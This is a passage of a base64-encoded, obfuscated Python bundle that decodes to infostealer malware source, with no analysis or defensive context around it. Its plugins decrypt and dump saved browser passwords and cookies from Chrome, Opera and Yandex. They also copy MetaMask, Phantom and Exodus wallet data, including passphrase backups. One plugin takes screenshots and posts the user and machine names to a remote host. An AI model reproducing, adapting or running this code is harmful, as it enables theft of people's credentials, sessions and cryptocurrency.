xbGl0ZS5jb25uZWN0KHRlbXBfcGF0aCkgYXMgY29ubjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgc3FsID0gJ3NlbGVjdCAqIGZyb20gbG9naW5zJ1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGNvbm4uZXhlY3V0ZShzcWwpIGFzIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luYyBmb3Igcm93IGluIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb3dzLmFwcGVuZCgocm93WzFdLCByb3dbM10sIHNlbGYuZGVjcnlwdG9yLmRlY3J5cHRfcGFzc3dvcmQocm93WzVdKSkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YjRceGQwXHhiNVx4ZDBceGJhXHhkMVx4ODBceGQwXHhiOFx4ZDBceGJmXHhkMVx4ODJceGQwXHhiNSBceGQwXHhiZlx4ZDBceGIwXHhkMVx4ODBceGQwXHhiZVx4ZDBceGJiXHhkMVx4OGYsIHtlfScpXHJcbiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGJmXHhkMFx4YmVceGQwXHhiZlx4ZDFceDhiXHhkMVx4ODJceGQwXHhiYVx4ZDBceGI1IFx4ZDFceDgxXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjRceGQwXHhiOFx4ZDFceDgyXHhkMVx4OGMgXHhkMFx4YmZceGQwXHhiMFx4ZDFceDgwXHhkMFx4YmVceGQwXHhiYlx4ZDBceGI4IFx4ZDFceDgxIHtwfSwgXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIHtlfScpXHJcblxyXG4gICAgICAgICAgICBpZiByb3dzOlxyXG4gICAgICAgICAgICAgICAgbmFtZSA9IGYne3NwbGl0KHJvb3RfcGF0aClbMV19X3t0b2tlbl9oZXgoNSl9LnR4dCdcclxuICAgICAgICAgICAgICAgIHBhc3N3b3Jkc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdwYXNzd29yZHMnKVxyXG4gICAgICAgICAgICAgICAgcGF0aCA9IGpvaW4ocGFzc3dvcmRzX3BhdGgsIG5hbWUpXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKHBhc3N3b3Jkc19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICBta2RpcihwYXNzd29yZHNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIG9wZW4ocGF0aCwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgICAgICAgICAgZm9yIHVybCwgbG9naW4sIHBhc3N3b3JkIGluIHJvd3M6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGYud3JpdGUoZidVUkw6IHt1cmx9XFxuTG9naW46IHtsb2dpbn1cXG5QYXNzd29yZDoge3Bhc3N3b3JkfVxcblxcbicpXHJcblxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZFx4ZDFceDhiIFx4ZDBceGJmXHhkMFx4YjBceGQxXHg4MFx4ZDBceGJlXHhkMFx4YmJceGQwXHhiOCBceGQxXHg4MSB7cm9vdF9wYXRofScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0Vycm9yIGluIHN0ZWFsX3Bhc3N3b3JkOiB7ZX0nKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGVhbF9jb29raWVzKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKHJvb3RfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgICAgIGNvb2tpZXMgPSAnJ1xyXG5cclxuICAgICAgICAgICAgY29va2llX2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnLCAnbmV0d29yaycpLCBcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnKSxcclxuICAgICAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMoY29va2llX2ZvbGRlcl9wYXRocywgeydDb29raWVzJywgJ2Nvb2tpZXMuc3FsaXRlJ30pOlxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZmlsZShwKTpcclxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgICAgIHRlbXBfcGF0aCA9IGpvaW4oVEVNUCwgZidDb29raWVzIHt0aW1lKCl9JylcclxuICAgICAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKHAsIHRlbXBfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5kZWNyeXB0b3I6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5zZXRfZGVjcnlwdG9yKHJvb3RfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGFpb3NxbGl0ZS5jb25uZWN0KHRlbXBfcGF0aCkgYXMgY29ubjpcclxuICAgICAgICAgICAgICAgICAgICBzcWwgPSAnc2VsZWN0ICogZnJvbSBjb29raWVzJ1xyXG4gICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggY29ubi5leGVjdXRlKHNxbCkgYXMgY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgZm9yIHJvdyBpbiBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udiA9IGxhbWJkYSB4OiAnVFJVRScgaWYgeCBlbHNlICdGQUxTRSdcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaG9zdCA9IHJvd1sxXVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh0dHBfb25seSA9IGNvbnYocm93WzldKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGggPSByb3dbNl1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWN1cmUgPSBjb252KHJvd1s4XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHBpcmF0aW9uX2RhdGUgPSBzdHIocm93WzddKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSByb3dbM11cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9IHNlbGYuZGVjcnlwdG9yLmRlY3J5cHRfcGFzc3dvcmQocm93WzVdKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODBceGQwXHhiOCBceGQwXHhiNFx4ZDBceGI1XHhkMFx4YmFceGQxXHg4MFx4ZDBceGI4XHhkMFx4YmZceGQxXHg4Mlx4ZDBceGI1IFx4ZDBceGJhXHhkMVx4ODNceGQwXHhiYVx4ZDBceGIwLCB7ZX0nKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdmFsdWU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSAnJ1xyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZSA9ICdcXHQnLmpvaW4oXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKGhvc3QsIGh0dHBfb25seSwgcGF0aCwgc2VjdXJlLCBleHBpcmF0aW9uX2RhdGUsIG5hbWUsIHZhbHVlKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZXMgKz0gY29va2llICsgJ1xcbidcclxuXHJcbiAgICAgICAgICAgIGlmIGNvb2tpZXM6XHJcbiAgICAgICAgICAgICAgICBuYW1lID0gZid7c3BsaXQocm9vdF9wYXRoKVsxXX1fe3Rva2VuX2hleCg1KX0udHh0J1xyXG4gICAgICAgICAgICAgICAgY29va2llc19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICdjb29raWVzJylcclxuICAgICAgICAgICAgICAgIHBhdGggPSBqb2luKGNvb2tpZXNfcGF0aCwgbmFtZSlcclxuICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKGNvb2tpZXNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgbWtkaXIoY29va2llc19wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggb3BlbihwYXRoLCAndycsIGVuY29kaW5nPSd1dGY4JykgYXMgZjpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBmLndyaXRlKGNvb2tpZXMpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZFx4ZDFceDhiIFx4ZDBceGJhXHhkMVx4ODNceGQwXHhiYVx4ZDBceGI4IFx4ZDFceDgxIHtyb290X3BhdGh9JylcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRXJyb3IgaW4gc3RlYWxfY29va2llczoge2V9JylcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0ZWFsX3dhbGxldHMoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBbXVxyXG5cclxuICAgICAgICAgICAgd2FsbGV0X2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJyksIFxyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJyksIFxyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICdsb2NhbCBleHRlbnNpb24gc2V0dGluZ3MnKVxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICB3YWxsZXRzID0ge1xyXG4gICAgICAgICAgICAgICAgJ25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uJzogJ21ldGFtYXNrJyxcclxuICAgICAgICAgICAgICAgICdiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYSc6ICdwaGFudG9tJ1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMod2FsbGV0X2ZvbGRlcl9wYXRocywgc2V0KHdhbGxldHMua2V5cygpKSk6XHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIocCk6XHJcbiAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgd2FsbGV0c19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICd3YWxsZXRzJylcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2Rpcih3YWxsZXRzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgIG1rZGlyKHdhbGxldHNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBuYW1lID0gc3BsaXQocClbMV1cclxuICAgICAgICAgICAgICAgIHdhbGxldF9uYW1lID0gd2FsbGV0c1tuYW1lXVxyXG4gICAgICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbih3YWxsZXRzX3BhdGgsIGYne3dhbGxldF9uYW1lfV97dG9rZW5faGV4KDQpfScpXHJcblxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGNvcHl0cmVlKHAsIGRlc3RfcGF0aClcclxuICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICBwYXNzXHJcblxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZCBceGQwXHhiMlx4ZDBceGI1XHhkMFx4YjEgXHhkMFx4YmFceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjVceGQwXHhiYlx4ZDFceDhjIFx4ZDFceDgxIHtwfScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YmZceGQwXHhiZVx4ZDBceGJmXHhkMVx4OGJceGQxXHg4Mlx4ZDBceGJhXHhkMFx4YjUgXHhkMVx4ODFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNFx4ZDBceGI4XHhkMVx4ODJceGQxXHg4YyBceGQwXHhiMlx4ZDBceGI1XHhkMFx4YjEgXHhkMFx4YmFceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjVceGQwXHhiYlx4ZDBceGI1XHhkMFx4YmEge3Jvb3RfcGF0aH0nKVxyXG4gICAgXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBjaHJvbWl1bV9icm93c2VyX25hbWVzID0ge1xyXG4gICAgICAgICAgICAnb3BlcmEgZ3ggc3RhYmxlJyxcclxuICAgICAgICAgICAgJ29wZXJhIHN0YWJsZScsXHJcbiAgICAgICAgICAgICdjaHJvbWUnLFxyXG4gICAgICAgICAgICAneWFuZGV4YnJvd3NlcidcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHRhc2tzOiBMaXN0W1Rhc2tdID0gW11cclxuXHJcbiAgICAgICAgZm9yIGZvbGRlcl9uYW1lIGluIGNocm9taXVtX2Jyb3dzZXJfbmFtZXMuaW50ZXJzZWN0aW9uKGkubmFtZS5sb3dlcigpIGZvciBpIGluIHNjYW5kaXIocGF0aCkpOlxyXG4gICAgICAgICAgICByb290X3BhdGggPSBqb2luKHBhdGgsIGZvbGRlcl9uYW1lKVxyXG4gICAgICAgICAgICB0YXNrcy5hcHBlbmQoY3JlYXRlX3Rhc2soc2VsZi5zdGVhbF9wYXNzd29yZChyb290X3BhdGgpKSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfY29va2llcyhyb290X3BhdGgpKSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfd2FsbGV0cyhyb290X3BhdGgpKSlcclxuXHJcbiAgICAgICAgZm9yIHRhc2sgaW4gdGFza3M6XHJcbiAgICAgICAgICAgIHRhc2suYWRkX2RvbmVfY2FsbGJhY2sobGFtYmRhIHg6IF9oYW5kbGVfdGFza19yZXN1bHQoeCwgc2VsZi5jb25mLmxvZ2dlcikpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgIGZvciB0YXNrIGluIHRhc2tzOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCB0YXNrXHJcbiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnRXJyb3IgaW4gY2hyb21pdW0gdGFza3M6IHtlfScpXHJcbiAgICAgICAgICAgICAgICAiKSNsaW5lOjY1CiAgICBfX09PME9PMDBPME8wME9PT09PICgncGx1Z2lucy9kZXRhaWxzLnB5JyxiImZyb20gYXN5bmNpbyBpbXBvcnQgY3JlYXRlX3Rhc2tcclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5pbXBvcnQgb3NcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luXHJcbmltcG9ydCBwbGF0Zm9ybVxyXG5mcm9tIGFpb2ZpbGVzIGltcG9ydCBvcGVuXHJcbmZyb20gbXNzLndpbmRvd3MgaW1wb3J0IE1TUyBhcyBtc3NcclxuZnJvbSB0b29scyBpbXBvcnQgbW92ZVxyXG5cclxuXHJcblxyXG5jbGFzcyBEZXRhaWxzKCk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcbiAgICBhc3luYyBkZWYgdGFrZV9zY3JlZW5zaG90KHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgd2l0aCBtc3MoKSBhcyBzY3Q6XHJcbiAgICAgICAgICAgIGZvciBmaWxlbmFtZSBpbiBzY3Quc2F2ZSgpOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgbW92ZShmaWxlbmFtZSwgam9pbihzZWxmLmNvbmYubG9nX3BhdGgsIGZpbGVuYW1lKSlcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiYVx4ZDFceDgwXHhkMFx4YjhceGQwXHhiZFx4ZDFceDg4XHhkMFx4YmVceGQxXHg4MiB7ZmlsZW5hbWV9IFx4ZDFceDgxXHhkMFx4YmVceGQxXHg4NVx4ZDFceDgwXHhkMFx4YjBceGQwXHhiZFx4ZDBceGI1XHhkMFx4YmQnKVxyXG4gXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBiZ190YXNrID0gY3JlYXRlX3Rhc2soc2VsZi50YWtlX3NjcmVlbnNob3QoKSlcclxuICAgICAgICB1c2VyID0gb3MuZ2V0bG9naW4oKVxyXG4gICAgICAgIHBjID0gcGxhdGZvcm0ubm9kZSgpXHJcbiAgICAgICAgdGFnID0gc2VsZi5jb25mLnRhZ1xyXG5cclxuICAgICAgICBkYXRhID0ge1xyXG4gICAgICAgICAgICAnY2xpZW50X2lkJzogc2VsZi5jb25mLmNsaWVudF9pZCxcclxuICAgICAgICAgICAgJ3RhZyc6IHRhZyxcclxuICAgICAgICAgICAgJ3VzZXJfbmFtZSc6IHVzZXIsXHJcbiAgICAgICAgICAgICdwY19uYW1lJzogcGNcclxuICAgICAgICB9XHJcbiAgICAgICAgXHJcbiAgICAgICAgdXJsID0gZid7c2VsZi5jb25mLmhvc3R9L3JlY2VpdmVfZGV0YWlscydcclxuXHJcbiAgICAgICAgcmVzcCA9IGF3YWl0IHNlbGYuY29uZi5zZXNzaW9uLnBvc3QodXJsLCBqc29uPWRhdGEpXHJcblxyXG4gICAgICAgIGFzeW5jIHdpdGggb3Blbihqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgJ2RldGFpbHMudHh0JyksICd3JywgZW5jb2Rpbmc9J3V0ZjgnKSBhcyBmOlxyXG4gICAgICAgICAgICBhd2FpdCBmLndyaXRlKGYndXNlciBuYW1lOiB7dXNlcn1cXG5wYyBuYW1lOiB7cGN9XFxudGFnOiB7dGFnfScpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4Mlx4ZDFceDgxXHhkMVx4ODJceGQxXHg4M1x4ZDBceGJhIFx4ZDBceGJlXHhkMVx4ODJceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjBceGQwXHhiMlx4ZDBceGJiXHhkMFx4YjVceGQwXHhiZCcpXHJcblxyXG4gICAgICAgIGF3YWl0IGJnX3Rhc2siKSNsaW5lOjY2CiAgICBfX09PME9PMDBPME8wME9PT09PICgncGx1Z2lucy93YWxsZXRzL19faW5pdF9fLnB5JyxiJ2Zyb20gLmV4b2R1cyBpbXBvcnQgRXhvZHVzJykjbGluZTo2NwogICAgX19PTzBPTzAwTzBPMDBPT09PTyAoJ3BsdWdpbnMvd2FsbGV0cy9leG9kdXMucHknLGInZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luXHJcbmZyb20gb3MgaW1wb3J0IG1rZGlyLCB3YWxrXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHl0cmVlLCBjb3B5ZmlsZVxyXG5cclxuXHJcblxyXG5jbGFzcyBFeG9kdXMoUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHdhbGxldHNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCBcJ3dhbGxldHNcJylcclxuICAgICAgICBpZiBub3QgaXNkaXIod2FsbGV0c19wYXRoKTpcclxuICAgICAgICAgICAgbWtkaXIod2FsbGV0c19wYXRoKVxyXG4gICAgICAgIFxyXG4gICAgICAgIGxvZ19leG9kdXNfcGF0aCA9IGpvaW4od2FsbGV0c19wYXRoLCBmXCdleG9kdXNfe3Rva2VuX2hleCg0KX1cJylcclxuXHJcbiAgICAgICAgd2FsbGV0X2ZvbGRlciA9IGpvaW4ocGF0aCwgXCdleG9kdXMud2FsbGV0XCcpXHJcbiAgICAgICAgaWYgaXNkaXIod2FsbGV0X2ZvbGRlcik6XHJcbiAgICAgICAgICAgIGF3YWl0IGNvcHl0cmVlKHdhbGxldF9mb2xkZXIsIGxvZ19leG9kdXNfcGF0aClcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGZcJ1x4ZDBceGExXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjZceGQwXHhiNVx4ZDBceGJkIGV4b2R1cyBceGQxXHg4MSB7cGF0aH1cJylcclxuXHJcbiAgICAgICAgYmFjdWtwc19mb2xkZXIgPSBqb2luKHBhdGgsIFwnYmFja3Vwc1wnKVxyXG4gICAgICAgIGZvciBkaXJwYXRoLCBkaXJuYW1lcywgZmlsZW5hbWVzIGluIHdhbGsoYmFjdWtwc19mb2xkZXIpOlxyXG4gICAgICAgICAgICBmb3IgZiBpbiBmaWxlbmFtZXM6XHJcbiAgICAgICAgICAgICAgICBpZiBmID09ICJwYXNzcGhyYXNlLmpzb24iOlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihsb2dfZXhvZHVzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBta2Rpcihsb2dfZXhvZHVzX3BhdGgpXHJcbiAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgY29weWZpbGUoam9pbihkaXJwYXRoLCBmKSwgam9pbihsb2dfZXhvZHVzX3BhdGgsIGZcJ3Bhc3NwaHJhc2Vfe3Rva2VuX2hleCg0KX0uanNvblwnKSknKSNsaW5lOjY4CiAgICBfX09PME9PMDBPME8wME9PT09PICgncGx1Z2lucy93YWxsZXRzL0V4b2R1cy5weScsYidmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHdhbGtcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weXRyZWUsIGNvcHlmaWxlXHJcblxyXG5cclxuXHJcbmNsYXNzIEV4b2R1cyhQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHBhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgd2FsbGV0c19wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsIFwnd2FsbGV0c1wnKVxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih3YWxsZXRzX3BhdGgpOlxyXG4gICAgICAgICAgICBta2Rpcih3YWxsZXRzX3BhdGgpXHJcbiAgICAgICAgXHJcbiAgICAgICAgbG9nX2V4b2R1c19wYXRoID0gam9pbih3YWxsZXRzX3BhdGgsIGZcJ2V4b2R1c197dG9rZW5faGV4KDQpfVwnKVxyXG5cclxuICAgICAgICB3YWxsZXRfZm9sZGVyID0gam9pbihwYXRoLCBcJ2V4b2R1cy53YWxsZXRcJylcclxuICAgICAgICBpZiBpc2Rpcih3YWxsZXRfZm9sZGVyKTpcclxuICAgICAgICAgICAgYXdhaXQgY29weXRyZWUod2FsbGV0X2ZvbGRlciwgbG9nX2V4b2R1c19wYXRoKVxyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZlwnXHhkMFx4YTFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNlx4ZDBceGI1XHhkMFx4YmQgZXhvZHVzIFx4ZDFceDgxIHtwYXRofVwnKVxyXG5cclxuICAgICAgICBiYWN1a3BzX2ZvbGRlciA9IGpvaW4ocGF0aCwgXCdiYWNrdXBzXCcpXHJcbiAgICAgICAgZm9yIGRpcnBhdGgsIGRpcm5hbWVzLCBmaWxlbmFtZXMgaW4gd2FsayhiYWN1a3BzX2ZvbGRlcik6XHJcbiAgICAgICAgICAgIGZvciBmIGluIGZpbGVuYW1lczpcclxuICAgICAgICAgICAgICAgIGlmIGYgPT0gInBhc3NwaHJhc2UuanNvbiI6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKGxvZ19leG9kdXNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG1rZGlyKGxvZ19leG9kdXNfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShqb2luKGRpcnBhdGgsIGYpLCBqb2luKGxvZ19leG9kdXNfcGF0aCwgZlwncGFzc3BocmFzZV97dG9rZ